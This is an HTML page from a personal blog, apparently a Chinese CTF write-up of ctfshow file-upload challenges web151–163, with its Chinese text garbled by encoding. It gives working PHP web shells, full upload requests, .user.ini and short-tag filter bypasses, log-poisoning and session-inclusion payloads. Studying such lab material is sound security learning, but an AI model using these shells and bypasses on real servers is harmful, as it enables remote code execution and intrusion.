<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2 | Evo1ution's blog</title><meta name="keywords" content="CTF,Web,ctfshow"><meta name="author" content="Evo1ution"><meta name="copyright" content="Evo1ution"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2 å‚è€ƒï¼š phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡) phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(æ”¾å¼ƒç¯‡) CTFSHOW ååºåˆ—åŒ–ç¯‡ CTFshow-WEBå…¥é—¨-ååºåˆ—åŒ– CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡ MySQL 5.7 Reference Manual MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°  æ–‡ä»¶ä¸Šä¼ web151æç¤ºå‰å°æ ¡éªŒä¸å¯é ï¼Œç¦ç”¨jsæˆ–è€…ç›´æ¥å‘åŒ…å°±å¯ï¼ˆpngå³å¯ï¼‰ POST &#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2">
<meta property="og:url" content="https://evolution957.github.io/2023/02/08/ctfshow-web2/index.html">
<meta property="og:site_name" content="Evo1ution&#39;s blog">
<meta property="og:description" content="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2 å‚è€ƒï¼š phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡) phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(æ”¾å¼ƒç¯‡) CTFSHOW ååºåˆ—åŒ–ç¯‡ CTFshow-WEBå…¥é—¨-ååºåˆ—åŒ– CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡ MySQL 5.7 Reference Manual MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°  æ–‡ä»¶ä¸Šä¼ web151æç¤ºå‰å°æ ¡éªŒä¸å¯é ï¼Œç¦ç”¨jsæˆ–è€…ç›´æ¥å‘åŒ…å°±å¯ï¼ˆpngå³å¯ï¼‰ POST &#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://evolution957.github.io/img/ctfshow_web2.png">
<meta property="article:published_time" content="2023-02-07T17:27:31.000Z">
<meta property="article:modified_time" content="2023-02-07T17:27:31.000Z">
<meta property="article:author" content="Evo1ution">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://evolution957.github.io/img/ctfshow_web2.png"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://evolution957.github.io/2023/02/08/ctfshow-web2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“","cht_to_chs":"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“","day_to_night":"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-08 01:27:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/iconfont.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Evo1ution's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">29</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">7</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/ctfshow_web2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evo1ution's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-07T17:27:31.000Z" title="å‘è¡¨äº 2023-02-08 01:27:31">2023-02-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-02-07T17:27:31.000Z" title="æ›´æ–°äº 2023-02-08 01:27:31">2023-02-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Web/">CTF_Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow Webå…¥é—¨ åˆ·é¢˜è®°å½• 2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2"><a href="#ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2" class="headerlink" title="ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2"></a>ctfshow-Webå…¥é—¨åˆ·é¢˜è®°å½•2</h1><blockquote>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13742666.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13831713.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(æ”¾å¼ƒç¯‡)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110558192?ops_request_misc=%7B%22request_id%22:%22167342861216800225578759%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=167342861216800225578759&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-110558192-null-null.article_score_rank_blog&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97&spm=1018.2226.3001.4450">CTFSHOW ååºåˆ—åŒ–ç¯‡</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113808539">CTFshow-WEBå…¥é—¨-ååºåˆ—åŒ–</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%7B%22request_id%22:%22167394115616800215092923%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=167394115616800215092923&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109537262-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4450">CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡</a></p>
<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html">MySQL 5.7 Reference Manual</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/212587.htm">MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°</a></p>
</blockquote>
<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>æç¤º<code>å‰å°æ ¡éªŒä¸å¯é </code>ï¼Œç¦ç”¨<code>js</code>æˆ–è€…ç›´æ¥å‘åŒ…å°±å¯ï¼ˆ<code>png</code>å³å¯ï¼‰</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>202</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7VSPjBqZx9Pl0H7T</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://0e85dc83-97fd-4ea9-921a-3c2b43d36b63.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>msg=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary7VSPjBqZx9Pl0H7T</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary7VSPjBqZx9Pl0H7T--</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åç›´æ¥èšå‰‘è¿æ¥æˆ–è€…æ‰§è¡Œå‘½ä»¤å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/a.php?1=system(&#x27;tac ../flag.php&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>æç¤ºåç«¯æ ¡éªŒè¦ä¸¥å¯†ï¼Œç›´æ¥å‘åŒ…</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>203</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqZyuIUBOwCSDs4xw</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39421927-8d0d-4ee1-a509-91e361c3b7ee.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>msg=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqZyuIUBOwCSDs4xw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqZyuIUBOwCSDs4xw--</span></span><br></pre></td></tr></table></figure>

<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿ<code>.user.ini</code>çš„åˆ©ç”¨</p>
<p>ä¸Šä¼ å›¾ç‰‡ğŸ</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ é…ç½®æ–‡ä»¶</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/index.php?1=system(%27tac%20../flag.php%27);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä½†æ˜¯è¿™ç§æ–¹å¼å…¶å®æ˜¯æœ‰ä¸ªå‰æçš„ï¼Œå› ä¸º.user.iniåªå¯¹ä»–åŒä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ä»–åŒç›®å½•ä¸‹æœ‰phpæ–‡ä»¶æ‰å¯ä»¥ã€‚</p>
</blockquote>
<p>å¯¹äºè¿™ä¸ªé¢˜ï¼Œå› ä¸ºuploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</p>
<h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>è¿™é‡Œå¯¹æ–‡ä»¶å†…å®¹ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ•…å¯ä»¥ä½¿ç”¨ä¸€äº›çŸ­æ ‡ç­¾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®</span></span><br><span class="line"><span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span>  ç­‰ä»·äº <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œ7.0åŠä»¥ä¸Šä¿®æ”¹å®Œä¹‹åä¹Ÿä¸èƒ½ä½¿ç”¨ï¼Œè€Œæ˜¯æŠ¥500é”™è¯¯ï¼Œä½†æ˜¯7.0ä»¥ä¸‹ç‰ˆæœ¬åœ¨ä¿®æ”¹å®Œé…ç½®åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚    </span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚</span></span><br><span class="line">&lt;script language=â€phpâ€&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åé¢å‘ç°è²Œä¼¼å¯¹<code>flag</code>å­—ç¬¦ä¹Ÿè¿‡æ»¤äº†ï¼Œå¯ä»¥ç›´æ¥ä¼ ğŸç»•è¿‡å»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥è¿™æ ·å†™</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–åŒ<code>web153</code></p>
<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p><code>[]</code>è¢«banäº†ï¼Œæ¢ç”¨<code>&#123;&#125;</code>å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä»–åŒ<code>web153</code></p>
<h2 id="web157-159"><a href="#web157-159" class="headerlink" title="web157-159"></a>web157-159</h2><p>è¿‡æ»¤äº†<code>&#123;&#125;</code>å’Œ<code>;</code>ï¼Œç›´æ¥è¾“å‡º<strong>flag</strong>å³å¯ï¼Œå›¾ç‰‡ğŸå¦‚ä¸‹ï¼Œå…¶ä»–åŒ<code>web153</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…è¿™ç§ä¹Ÿå¯(<code>web159</code>è¿‡æ»¤äº†æ‹¬å·ä¸å¯ä»¥è¿™æ ·)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>è¿‡æ»¤äº†æ‹¬å·åå¼•å·è¿˜æœ‰ä¸€äº›å…³é”®å­—ï¼Œé‡‡å–æ—¥å¿—åŒ…å«ï¼Œç”±äº<code>log</code>å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦æ‹¼æ¥ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ å®Œæ”¹å›¾ç‰‡ğŸåä¸Šä¼ <code>.user.ini</code>ï¼Œç„¶åä¿®æ”¹<code>UA</code>è®¿é—®<code>/upload.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>å¢åŠ å›¾ç‰‡å¤´å³å¯ï¼Œå…¶ä»–åŒ<code>web160</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web162-163"><a href="#web162-163" class="headerlink" title="web162-163"></a>web162-163</h2><p><code>session</code>åŒ…å«ï¼Œä¼ ğŸ</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;png&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_evo1&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¼ é…ç½®æ–‡ä»¶</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_append_file=&quot;png&quot;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%7B%22request_id%22:%22167394115616800215092923%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=167394115616800215092923&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109537262-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4450">yu22xå¸ˆå‚…è„šæœ¬</a>æ”¹ä¸€ä¸‹å³å¯</p>
